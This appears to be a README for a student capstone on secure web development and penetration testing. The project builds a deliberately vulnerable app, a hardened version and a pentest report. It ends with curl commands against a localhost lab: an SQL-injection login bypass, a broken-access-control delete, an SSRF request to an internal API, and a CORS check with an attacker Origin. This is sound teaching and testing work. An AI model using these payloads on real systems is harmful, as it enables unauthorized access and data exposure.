# Capstone — Secure Web App Development & Penetration Testing Lifecycle

Four phases, same app, evolving across each:

1. **[phase-1-vulnerable-baseline/](phase-1-vulnerable-baseline/)** — build a
   working full-stack app with authentication and role-based access control.
   11 real vulnerabilities are deliberately left in and documented for later
   phases to find and fix.
2. **[phase-2-secure-implementation/](phase-2-secure-implementation/)** — the
   same app, rebuilt: server-side input validation, secure session
   management, hashed passwords, and a proper separation-of-concerns module
   layout (see its `ARCHITECTURE.md`).
3. **Pentest** — every Phase 1 vulnerability enumerated and exploited, then
   re-run against Phase 2 to confirm it's blocked. Lives in
   [`../iteration-3-web-app-pentesting/`](../iteration-3-web-app-pentesting/)
   since it's shared with the Iteration 3 course deliverable rather than
   duplicated per phase.
4. **Report** — executive summary, technical findings, proof of concept, and
   remediation recommendations:
   [`../iteration-3-web-app-pentesting/TaskForge_Penetration_Test_Report.docx`](../iteration-3-web-app-pentesting/TaskForge_Penetration_Test_Report.docx)

Each phase folder's own `README.md` has the full detail (vulnerability
tables, seed accounts, how to run it).




bash
curl -i -X POST http://localhost:3001/api/login \
  -H "Content-Type: application/json" \
  --data-raw '{"username":"admin'\'' -- ","password":"anything"}'



bash
curl -s -c cookies2.txt -X POST http://localhost:3001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"employee1","password":"employee123"}'
curl -i -b cookies2.txt -X DELETE http://localhost:3001/api/tasks/2



bash
curl -i -s -b cookies2.txt -X POST http://localhost:3001/api/tasks/1/preview \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:3001/api/users"}'


bash
curl -i -s -b cookies2.txt -H "Origin: https://attacker.example" \
  http://localhost:3001/api/users | grep -i "access-control-allow-origin"